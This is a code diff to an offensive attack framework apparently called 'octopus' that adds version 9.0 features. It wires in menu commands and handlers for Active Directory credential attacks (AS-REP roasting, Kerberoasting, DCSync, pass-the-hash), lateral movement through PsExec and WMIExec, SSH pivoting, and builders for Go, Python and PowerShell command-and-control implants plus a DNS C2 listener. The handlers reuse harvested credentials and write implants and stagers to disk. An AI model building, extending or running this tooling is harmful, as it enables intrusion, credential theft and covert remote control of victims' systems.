@@ -85,6 +85,23 @@ TOOLS_MENU = {
     "32": ("shodan range",       lambda t: _run_shodan_range(t)),
     "33": ("cpanel exploit",     lambda t: _run_cpanel_exploit(t)),
     "34": ("shardbrowser",       lambda t: _run_shardbrowser_osint(t)),
+    # ── v9.0: Active Directory ──
+    "35": ("AD enumerate",       lambda t: _run_ad_tool("enum", t)),
+    "36": ("AS-REP Roast",       lambda t: _run_ad_tool("asrep", t)),
+    "37": ("Kerberoast",         lambda t: _run_ad_tool("kerberoast", t)),
+    "38": ("DCSync",             lambda t: _run_ad_tool("dcsync", t)),
+    "39": ("Pass-the-Hash",      lambda t: _run_ad_tool("pth", t)),
+    "40": ("PsExec",             lambda t: _run_ad_tool("psexec", t)),
+    "41": ("WMIExec",            lambda t: _run_ad_tool("wmiexec", t)),
+    # ── v9.0: Pivoting ──
+    "42": ("SOCKS proxy",        lambda t: _run_pivot_tool("socks", t)),
+    "43": ("port forward",       lambda t: _run_pivot_tool("forward", t)),
+    "44": ("network recon",      lambda t: _run_pivot_tool("netinfo", t)),
+    # ── v9.0: C2 Implants ──
+    "45": ("build Go implant",   lambda t: _run_c2_build("go", t)),
+    "46": ("build Py implant",   lambda t: _run_c2_build("python", t)),
+    "47": ("build PS stager",    lambda t: _run_c2_build("powershell", t)),
+    "48": ("DNS C2 listener",    lambda t: _run_c2_build("dns", t)),
 }
 
 # ─────────────────────────────────────────────
@@ -477,6 +494,51 @@ def run_tool_by_command(command_str: str) -> str:
 
         except Exception as e:
             return f"[!] ShardBrowser error: {e}"
+
+    # ── AD TOOLS (v9.0) ─────────────────────────────────
+    if cmd_lower in ["ad_enum", "ad_enumerate", "enumerate_ad"] and len(parts) >= 2:
+        return _run_ad_tool("enum", _extract_ip(parts[1]))
+
+    if cmd_lower in ["asrep_roast", "asreproast", "as_rep_roast"] and len(parts) >= 2:
+        return _run_ad_tool("asrep", _extract_ip(parts[1]))
+
+    if cmd_lower in ["kerberoast", "kerberoasting"] and len(parts) >= 2:
+        return _run_ad_tool("kerberoast", _extract_ip(parts[1]))
+
+    if cmd_lower in ["dcsync", "dc_sync", "secretsdump"] and len(parts) >= 2:
+        return _run_ad_tool("dcsync", _extract_ip(parts[1]))
+
+    if cmd_lower in ["pass_the_hash", "pth"] and len(parts) >= 2:
+        return _run_ad_tool("pth", _extract_ip(parts[1]))
+
+    if cmd_lower in ["psexec", "ps_exec"] and len(parts) >= 2:
+        return _run_ad_tool("psexec", _extract_ip(parts[1]))
+
+    if cmd_lower in ["wmiexec", "wmi_exec"] and len(parts) >= 2:
+        return _run_ad_tool("wmiexec", _extract_ip(parts[1]))
+
+    # ── PIVOT TOOLS (v9.0) ──────────────────────────────
+    if cmd_lower in ["socks_proxy", "socks", "proxy"] and len(parts) >= 2:
+        return _run_pivot_tool("socks", _extract_ip(parts[1]))
+
+    if cmd_lower in ["port_forward", "forward", "portforward"] and len(parts) >= 2:
+        return _run_pivot_tool("forward", _extract_ip(parts[1]))
+
+    if cmd_lower in ["network_recon", "net_recon", "netinfo"] and len(parts) >= 2:
+        return _run_pivot_tool("netinfo", _extract_ip(parts[1]))
+
+    # ── C2 BUILD TOOLS (v9.0) ───────────────────────────
+    if cmd_lower in ["build_go_implant", "go_implant", "garble_build"]:
+        target_ip = _extract_ip(parts[1]) if len(parts) >= 2 else "0.0.0.0"
+        return _run_c2_build("go", target_ip)
+
+    if cmd_lower in ["build_python_implant", "python_implant", "py_implant"]:
+        target_ip = _extract_ip(parts[1]) if len(parts) >= 2 else "0.0.0.0"
+        return _run_c2_build("python", target_ip)
+
+    if cmd_lower in ["build_ps_stager", "ps_stager", "powershell_stager"]:
+        target_ip = _extract_ip(parts[1]) if len(parts) >= 2 else "0.0.0.0"
+        return _run_c2_build("powershell", target_ip)
 
     # ── EVASION TOOLS (v4.1) ─────────────────────────────
     if cmd_lower in ["waf_detect", "detect_waf", "waf"] and len(parts) >= 2:
@@ -1063,6 +1125,169 @@ def run_arbitrary_cmd(cmd_str: str) -> str:
     return ToolResult(
         tool_name=tool, command=cmd_str, stdout=output,
         exit_code=_exit_code, duration=_duration)
+
+
+# ─────────────────────────────────────────────
+# v9.0: AD TOOL HANDLERS
+# ─────────────────────────────────────────────
+
+def _run_ad_tool(action: str, target: str) -> str:
+    """Dispatch Active Directory attack tools."""
+    import logging
+    logger = logging.getLogger("octopus.runner.ad")
+
+    try:
+        creds = get_best_creds_for_target(target, "ldap") or get_best_creds_for_target(target, "ssh") or {}
+        user = creds.get("username", "")
+        password = creds.get("password", "")
+
+        if action == "enum":
+            from core.killchain.ad.enumeration import run_ad_enum
+            return run_ad_enum(target, creds={"username": user, "password": password} if user else None)
+        elif action == "asrep":
+            from core.killchain.ad.kerberos import asrep_roast
+            return asrep_roast(target)
+        elif action == "kerberoast":
+            from core.killchain.ad.kerberos import kerberoast
+            if not user:
+                return "[!] Kerberoasting requires valid domain credentials. Run bruteforce or find creds first."
+            return kerberoast(target, {"username": user, "password": password})
+        elif action == "dcsync":
+            from core.killchain.ad.credential import dcsync
+            if not user:
+                return "[!] DCSync requires domain admin credentials."
+            return dcsync(target, {"username": user, "password": password})
+        elif action == "pth":
+            from core.killchain.ad.credential import pass_the_hash
+            nthash = input(f"\033[36m  NT Hash: \033[0m").strip()
+            if not nthash:
+                return "[!] Pass-the-Hash requires an NT hash."
+            return pass_the_hash(target, user or "Administrator", nthash)
+        elif action == "psexec":
+            from core.killchain.ad.lateral import psexec
+            if not user:
+                return "[!] PsExec requires valid credentials."
+            return psexec(target, {"username": user, "password": password})
+        elif action == "wmiexec":
+            from core.killchain.ad.lateral import wmiexec
+            if not user:
+                return "[!] WMIExec requires valid credentials."
+            return wmiexec(target, {"username": user, "password": password})
+        else:
+            return f"[!] Unknown AD action: {action}"
+    except ImportError as e:
+        return f"[!] AD module dependency missing: {e}\n    Install: pip install impacket ldap3"
+    except Exception as e:
+        logger.error(f"AD tool {action} failed: {e}")
+        return f"[!] AD {action} failed: {e}"
+
+
+# ─────────────────────────────────────────────
+# v9.0: PIVOT TOOL HANDLERS
+# ─────────────────────────────────────────────
+
+def _run_pivot_tool(action: str, target: str) -> str:
+    """Dispatch pivoting tools."""
+    import logging
+    logger = logging.getLogger("octopus.runner.pivot")
+
+    try:
+        creds = get_best_creds_for_target(target, "ssh") or {}
+        user = creds.get("username", "")
+        password = creds.get("password", "")
+
+        if not user:
+            return "[!] Pivoting requires SSH credentials. Find credentials first."
+
+        try:
+            import paramiko
+        except ImportError:
+            return "[!] paramiko not installed. Fix: pip install paramiko"
+
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        port = int(creds.get("port", 22))
+        ssh.connect(target, port=port, username=user, password=password, timeout=15)
+
+        if action == "socks":
+            from core.killchain.pivot import setup_socks_proxy
+            local_port = int(input(f"\033[36m  Local SOCKS port [1080]: \033[0m").strip() or "1080")
+            return setup_socks_proxy(ssh, local_port=local_port)
+        elif action == "forward":
+            from core.killchain.pivot import setup_local_forward
+            local_port = int(input(f"\033[36m  Local port: \033[0m").strip() or "8080")
+            remote_host = input(f"\033[36m  Remote host [127.0.0.1]: \033[0m").strip() or "127.0.0.1"
+            remote_port = int(input(f"\033[36m  Remote port: \033[0m").strip() or "80")
+            return setup_local_forward(ssh, local_port, remote_host, remote_port)
+        elif action == "netinfo":
+            from core.killchain.pivot import get_network_info
+            return get_network_info(ssh)
+        else:
+            ssh.close()
+            return f"[!] Unknown pivot action: {action}"
+    except Exception as e:
+        logger.error(f"Pivot tool {action} failed: {e}")
+        return f"[!] Pivot {action} failed: {e}"
+
+
+# ─────────────────────────────────────────────
+# v9.0: C2 BUILD HANDLERS
+# ─────────────────────────────────────────────
+
+def _run_c2_build(build_type: str, target: str) -> str:
+    """Dispatch C2 implant build tools."""
+    import logging
+    logger = logging.getLogger("octopus.runner.c2")
+
+    try:
+        c2_url = input(f"\033[36m  C2 URL [http://127.0.0.1:8443]: \033[0m").strip() or "http://127.0.0.1:8443"
+
+        if build_type == "go":
+            # Existing garble builder
+            from core.c2.builder import build_implant
+            goos = input(f"\033[36m  Target OS [linux]: \033[0m").strip() or "linux"
+            goarch = input(f"\033[36m  Target Arch [amd64]: \033[0m").strip() or "amd64"
+            return build_implant(c2_urls=[c2_url], target_os=goos, target_arch=goarch)
+
+        elif build_type == "python":
+            from core.c2.implants.python_implant import generate_python_implant
+            code = generate_python_implant(c2_urls=[c2_url], beacon_interval=60)
+            out_path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
+                                    "data", f"implant_python_{target.replace('.', '_')}.py")
+            os.makedirs(os.path.dirname(out_path), exist_ok=True)
+            with open(out_path, "w") as f:
+                f.write(code)
+            return f"[+] Python implant generated: {out_path}\n    Size: {len(code)} bytes\n    C2: {c2_url}"
+
+        elif build_type == "powershell":
+            from core.c2.implants.powershell_stager import generate_ps_stager, generate_ps_encoded
+            method = input(f"\033[36m  Method (iex/encoded) [iex]: \033[0m").strip() or "iex"
+            if method == "encoded":
+                code = generate_ps_encoded(c2_url)
+            else:
+                code = generate_ps_stager(c2_url, method="iex")
+            out_path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
+                                    "data", f"stager_{target.replace('.', '_')}.ps1")
+            os.makedirs(os.path.dirname(out_path), exist_ok=True)
+            with open(out_path, "w") as f:
+                f.write(code)
+            return f"[+] PowerShell stager generated: {out_path}\n    C2: {c2_url}"
+
+        elif build_type == "dns":
+            from core.c2.channels.dns import DNSChannel
+            domain = input(f"\033[36m  DNS C2 domain: \033[0m").strip()
+            if not domain:
+                return "[!] DNS C2 requires a domain name."
+            channel = DNSChannel(domain)
+            return f"[+] DNS C2 channel configured for: {domain}\n    Use channel.start_listener() to begin receiving beacons."
+
+        else:
+            return f"[!] Unknown build type: {build_type}"
+    except ImportError as e:
+        return f"[!] C2 module dependency missing: {e}"
+    except Exception as e:
+        logger.error(f"C2 build {build_type} failed: {e}")
+        return f"[!] C2 build failed: {e}"
 
 
 # ─────────────────────────────────────────────
